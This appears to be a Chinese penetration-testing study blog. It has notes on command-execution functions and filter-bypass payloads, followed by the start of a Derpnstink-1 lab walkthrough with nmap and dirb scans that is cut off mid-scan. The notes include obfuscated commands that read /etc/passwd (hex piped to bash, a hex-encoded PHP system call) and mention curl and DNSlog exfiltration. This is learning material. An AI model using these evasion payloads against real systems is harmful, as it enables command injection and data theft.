class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java. io.InputStream;  //导包操作</span><br><span class="line">import java. io.InputStreamReader;</span><br><span class="line">import java. io.BufferedReader;</span><br><span class="line">public class RuntimeTest&#123;</span><br><span class="line">  public static void main (String args []) throws Exception&#123;</span><br><span class="line">    if (args.length==0) &#123;</span><br><span class="line">      System.exit(1);  //没有参数就退出</span><br><span class="line">    &#125;</span><br><span class="line">    String command = args[0];</span><br><span class="line">    Runtime run = Runtime.getRuntime();</span><br><span class="line">    Process pro = run. exec(command);  //执行命令</span><br><span class="line">    InputStreamReader in = new InputStreamReader(pro.getInputStream());</span><br><span class="line">    BufferedReader buff = new BufferedReader(in);</span><br><span class="line">    for(String temp = buff.readLine();temp!=null;temp=buff.readLine())&#123;</span><br><span class="line">      System.out.println(temp);  //输出结果</span><br><span class="line">    &#125;</span><br><span class="line">  buff .close();</span><br><span class="line">  in.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://i-blog.csdnimg.cn/blog_migrate/09d9415acac67ac95c041a356d92fc63.png">https://i-blog.csdnimg.cn/blog_migrate/09d9415acac67ac95c041a356d92fc63.png</a><br>(先拿别人的图凑数(bushi))</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exec(string)# Python代码的动态执行</span><br><span class="line">eval(string)# 返回表达式或代码对象的值</span><br><span class="line">execfile(string)# 从一个文件中读取和执行Python脚本</span><br><span class="line">input(string)# Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入</span><br><span class="line">compile(string)# 将源字符串编译为可执行对象</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>命令执行<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system()# 执行系统指令</span><br><span class="line">popen()# popen()方法用于从一个命令打开一个管道</span><br><span class="line">subprocess.call # 执行由参数提供的命令</span><br><span class="line">spawn # 执行命令</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">https://blog.csdn.net/qq_41315957/article/details/118855865</a></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>如果过滤了一些分隔符，可以尝试讲分隔符编码(url,base64)绕过</p><h3 id="八进制绕过"><a href="#八进制绕过" class="headerlink" title="八进制绕过"></a>八进制绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\154\163&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是ls</p><h3 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;636174202F6574632F706173737764&quot; | xxd -r -p|bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ echo &quot;636174202F6574632F706173737764&quot; | xxd -r -p|bash</span><br><span class="line">root:x:0:0:root:/root:/usr/bin/zsh</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">···太长了后面省略了</span><br></pre></td></tr></table></figure><p>十六进制还有个字符串过滤的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ php -r &#x27;&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat /etc/passwd&quot;);&#x27; </span><br><span class="line">root:x:0:0:root:/root:/usr/bin/zsh</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure></p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>linux内置的分隔符${IFS}，$IFS，$IFS$9</p><p>或者利用重定向符&lt;&gt;</p><h3 id="，-gt-过滤"><a href="#，-gt-过滤" class="headerlink" title="+，&gt;过滤"></a>+，&gt;过滤</h3><p>对于 &gt;,+ 等 符号的过滤 ，<code>$PS2变量为&gt;，$PS4变量则为+</code></p><h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">通过拆分命令达到绕过的效果：a=l;b=s;$a$b</span><br><span class="line">空变量绕过：cat fl$&#123;x&#125;ag cat tes$(z)t/flag</span><br><span class="line">控制环境变量绕过：</span><br><span class="line">先利用echo $PATH得到环境变量 =&gt; &quot;/usr/local/….blablabla”</span><br><span class="line">接着利用echo $&#123;#PATH&#125;得到长度</span><br><span class="line">然后要哪个字符截取哪个字符就行</span><br><span class="line">$&#123;PATH:0:1&#125; =&gt; ‘/’</span><br><span class="line">$&#123;PATH:1:1&#125; =&gt; ‘u’</span><br><span class="line">$&#123;PATH:0:4&#125; =&gt; ‘/usr’</span><br><span class="line">空值绕过：cat fl&quot;&quot;ag cat fl&#x27;&#x27;ag cat &quot;fl&quot;&quot;ag&quot;</span><br><span class="line">反斜杠绕过：ca\t flag l\s</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ echo $PATH                                             </span><br><span class="line">/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ echo $&#123;PATH&#125;</span><br><span class="line">/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ echo $&#123;PATH:1:1&#125;</span><br><span class="line">u</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ echo $&#123;PATH:0:5&#125;</span><br><span class="line">/usr/</span><br></pre></td></tr></table></figure><h3 id="空变量"><a href="#空变量" class="headerlink" title="空变量"></a>空变量</h3><p>$*和$@，$x(x 代表 1-9)，${x}(x&gt;=10)：比如ca${21}t a.txt表示cat a.txt<br>在没有传入参数的情况下，这些特殊字符默认为空，如下:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wh$1oami</span><br><span class="line"></span><br><span class="line">who$@ami</span><br><span class="line"></span><br><span class="line">whoa$*mi</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat 1.txt       </span><br><span class="line">$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ca&#123;123&#125;t 1.txt </span><br><span class="line">ca&#123;123&#125;t：未找到命令</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ca$&#123;123&#125;t 1.txt</span><br><span class="line">$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span><br></pre></td></tr></table></figure></p><h3 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h3><p>在Linux bash中还可以使用<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令<code>&#123;cat,flag&#125;</code></p><p>但是我反复尝试都不行，也不知道是为啥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ &#123;cat,1.txt&#125;</span><br><span class="line">cat,1.txt：未找到命令</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ $&#123;cat,1.txt&#125;</span><br><span class="line">zsh: bad substitution</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ $&#123;cat,/etc/passwd&#125;</span><br><span class="line">zsh: bad substitution</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ &#123;cat,/etc/passwd&#125; </span><br><span class="line">zsh: 没有那个文件或目录: cat,/etc/passwd</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ &#123;cat,/etc/passwd&#125;</span><br><span class="line">zsh: 没有那个文件或目录: cat,/etc/passwd</span><br></pre></td></tr></table></figure></p><h3 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h3><p>curl将命令的结果输出到访问的url中，可以在服务器中发现<br>（还没尝试，应该可行）</p><p><a href="https://imgse.com/i/pkbHlWt"><img src="https://s21.ax1x.com/2024/07/26/pkbHlWt.png" alt="pkbHlWt.png"></a></p><h3 id="get-defined-functions"><a href="#get-defined-functions" class="headerlink" title="get_defined_functions"></a>get_defined_functions</h3><p><code>php -r &#39;print_r(get_defined_functions()[&quot;internal&quot;]);&#39; | grep &#39;system&#39;</code></p><p>这个PHP系统函数会返回一个多维数组，该数组包含一个所有已定义函数（包括内部函数和用户定义函数）列表。内部函数可以通过$arr[“internal”]来表示，用户定义的函数可以使用$arr[“user”]来表示。</p><p>用法<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ php -r &#x27;print_r(get_defined_functions()[&quot;internal&quot;]);&#x27; | grep &#x27;system&#x27;</span><br><span class="line">    [562] =&gt; system</span><br><span class="line">                                                                                                                                     </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ php -r &#x27;print_r(get_defined_functions()[&quot;internal&quot;][&quot;562&quot;](&quot;whoami&quot;));&#x27;</span><br><span class="line">kali</span><br><span class="line">kali</span><br></pre></td></tr></table></figure></p><h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><p>PHP中的每个字符串都可视为一个字符数组，并且可以通过语法$string[2]或 $string[-3]来引用单个字符，这同时也是另一种绕过安全规则的方法<br>例如，仅仅使用字符串$a=”elmsty/ “;，我就可以组成命令执行语句system(“ls /tmp”);<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ php -r &#x27;$s=&quot;elmsty/ &quot;; ($s[3].$s[5].$s[3].$s[4].$s[0].$s[2])($s[1].$s[3].$s[-1].$s[-2].&quot;tmp&quot;);&#x27;</span><br><span class="line">ssh-IsnyfG8atHyV</span><br><span class="line">systemd-private-4ca3281a17864fe887e7753be4b15603-colord.service-LL67Bu</span><br><span class="line">systemd-private-4ca3281a17864fe887e7753be4b15603-haveged.service-mIMcQ1</span><br><span class="line">systemd-private-4ca3281a17864fe887e7753be4b15603-ModemManager.service-Ht7xiS</span><br><span class="line">systemd-private-4ca3281a17864fe887e7753be4b15603-polkit.service-Zscji7</span><br><span class="line">systemd-private-4ca3281a17864fe887e7753be4b15603-systemd-logind.service-MwIoxj</span><br><span class="line">systemd-private-4ca3281a17864fe887e7753be4b15603-systemd-timesyncd.service-qVL8zc</span><br><span class="line">systemd-private-4ca3281a17864fe887e7753be4b15603-upower.service-2qUlm5</span><br><span class="line">VMwareDnD</span><br><span class="line">vmware-root_620</span><br></pre></td></tr></table></figure></p><h3 id="引号逃逸"><a href="#引号逃逸" class="headerlink" title="引号逃逸"></a>引号逃逸</h3><p><code>$a = (string)foo;在这种情况下，变量$a就是字符串“foo”</code></p><p><a href="https://i-blog.csdnimg.cn/blog_migrate/e401020e7f9c2719f702aebd942af74f.png">https://i-blog.csdnimg.cn/blog_migrate/e401020e7f9c2719f702aebd942af74f.png</a></p><p><a href="https://imgse.com/i/pkbHgw4"><img src="https://s21.ax1x.com/2024/07/26/pkbHgw4.png" alt="pkbHgw4.png"></a></p><h3 id="DNSlog外带"><a href="#DNSlog外带" class="headerlink" title="DNSlog外带"></a>DNSlog外带</h3><p><a href="https://imgse.com/i/pkbHWk9"><img src="https://s21.ax1x.com/2024/07/26/pkbHWk9.png" alt="pkbHWk9.png"></a></p><p>当你有一个二级域名，比如test.vernus.top当有主机风闻1111.test.vernus.top的时候，就会被记录下来解析请求，这里的话我们就可以将代码放到前面了</p><p>具体可以参考这个</p><p><a href="https://www.cnblogs.com/hellobao/articles/17266933.html">https://www.cnblogs.com/hellobao/articles/17266933.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 渗透学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Derpnstink-1</title>
      <link href="/2025/01/08/2024%E5%B9%B47%E6%9C%8822%E6%97%A5-Derpnstink-1/"/>
      <url>/2025/01/08/2024%E5%B9%B47%E6%9C%8822%E6%97%A5-Derpnstink-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Derpnstink-1"><a href="#Derpnstink-1" class="headerlink" title="Derpnstink-1"></a>Derpnstink-1</h2><p>上来就是经典的扫描环节来进行信息收集<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sP 192.168.159.0/24</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 15:45 CST</span><br><span class="line">Nmap scan report for 192.168.159.1</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report for 192.168.159.2</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 00:50:56:E1:64:0A (VMware)</span><br><span class="line">Nmap scan report for 192.168.159.136</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">MAC Address: 00:0C:29:CA:2C:FC (VMware)</span><br><span class="line">Nmap scan report for 192.168.159.254</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">MAC Address: 00:50:56:E9:DF:17 (VMware)</span><br><span class="line">Nmap scan report for 192.168.159.129</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 6.11 seconds</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -A -p- 192.168.159.136</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 15:46 CST</span><br><span class="line">Nmap scan report for 192.168.159.136</span><br><span class="line">Host is up (0.00094s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)</span><br><span class="line">|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)</span><br><span class="line">|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)</span><br><span class="line">|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: DeRPnStiNK</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/php/ /temporary/</span><br><span class="line">MAC Address: 00:0C:29:CA:2C:FC (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.94 ms 192.168.159.136</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.30 seconds</span><br></pre></td></tr></table></figure><br>开放了21，22，80端口，先访问一下看看</p><p><a href="https://imgse.com/i/pk76XnK"><img src="https://s21.ax1x.com/2024/07/22/pk76XnK.png" alt="pk76XnK.png"></a></p><p>查看源码获得<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) --&gt;</span><br></pre></td></tr></table></figure></p><p>并且在webnote/info中提示要配置dns<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>扫描一下后台看看<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ dirb http://192.168.159.136/ </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Jul 22 15:55:12 2024</span><br><span class="line">URL_BASE: http://192.168.159.136/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.159.136/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.136/css/                                                   </span><br><span class="line">+ http://192.168.159.136/index.html (CODE:200|SIZE:1298)                                     </span><br><span 